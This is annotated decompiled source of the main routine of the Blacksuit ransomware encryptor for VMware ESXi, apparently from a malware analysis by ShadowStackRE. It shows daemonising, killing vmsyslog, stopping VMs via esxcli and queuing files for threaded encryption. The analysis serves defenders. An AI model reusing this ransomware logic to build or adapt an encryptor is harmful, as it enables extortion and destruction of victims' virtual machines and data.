////////////////////////////////////////////////////////////
// Blacksuit Encryptor
// https://www.shadowstackre.com/analysis/blacksuit-ransomware-esxi
// 
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

// Main entrypoint into the executable
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int *errnoAddress; // rax
  int v5; // ebx
  int *v6; // rax
  int *v7; // rax
  char v8[12]; // [rsp+10h] [rbp-20h] BYREF
  __pid_t pidID; // [rsp+1Ch] [rbp-14h]

  vmonly = 1;                                   // Identify VM only files or all files
  *(_QWORD *)&argc = (unsigned int)argc;
  // Parse arguments into global parameters which controls the features of the encryptor
  if ( (unsigned __int8)parseArguments(argc, (char **)argv) != 1 )
    return 1;
  if ( demonoff != 1 )                          // Enable or disable the demon process
  {
    pidID = fork();                             // Create a sub process
    if ( pidID < 0 )
      return 1;                                 // Error occured forking the process
    if ( pidID )                                // Parent process ID is not an error
      exit(0);
    setsid();                                   // Create a session and sets the process group ID
    pidID = fork();
    if ( pidID < 0 )
      return 2;                                 // Error occured forking the process
    if ( pidID )                                // Parent process ID is not an error
      exit(0);
    // Child process successfully created
    *(_QWORD *)&argc = "\nThe process is running, you can close...";
    puts("\nThe process is running, you can close...");
  }
  if ( noprotect != 1 && !RunningState() )      // Check if the encryptor is already running
    return 1;
  logs::init_write(*(logs **)&argc);
  if ( demonoff )
    logs::init_print(*(logs **)&argc);
  if ( on_vmsyslog != 1 )                       // Determine if VM watch dog processes are killed
  {
    // kill the watchdog process
    kill_vmsyslog();
    *(_QWORD *)&argc = "Terned off vmsyslog";
    logs::print((logs *)"Terned off vmsyslog", (const char *)argv);
  }
  // generate entropy for encryption
  if ( (unsigned __int8)generateEntropy(*(__int64 *)&argc, (const char *)argv) != 1 )
    return 1;
  massive_threads = (void *)operator new[](8LL * threads_count);
  if ( stopvm )
    // Stop the VM using the esxcli command line tool
    stop_vm(lstVmSkipID);
  // Start processing files for encryption as they are queued
  if ( (unsigned __int8)create_threads_pool() != 1 )
  {
    errnoAddress = __errno_location();
    logs::print((logs *)"Failed to create pool: (%d)", (const char *)(unsigned int)*errnoAddress);
    return 1;
  }
  else
  {
    std::string::string((std::string *)v8, (const std::string *)&path);
    // Search for files and submit them to the queue 
    // which will be processed by the encryptor thread
    v5 = search_files((const std::string *)v8) ^ 1;
    std::string::~string(v8);
    if ( (_BYTE)v5 )
    {
      v6 = __errno_location();
      logs::print((logs *)"File search error: (%d)", (const char *)(unsigned int)*v6);
      return 1;
    }
    else if ( (unsigned __int8)wait_exit_threads_pool() != 1 )
    {
      v7 = __errno_location();
      logs::print((logs *)"Error waiting threads: (%d)", (const char *)(unsigned int)*v7);
      return 1;
    }
    else
    {
      // Free up the memory associated with the thread pool
      if ( massive_threads )
        operator delete[](massive_threads);
      return 0;
    }
  }
}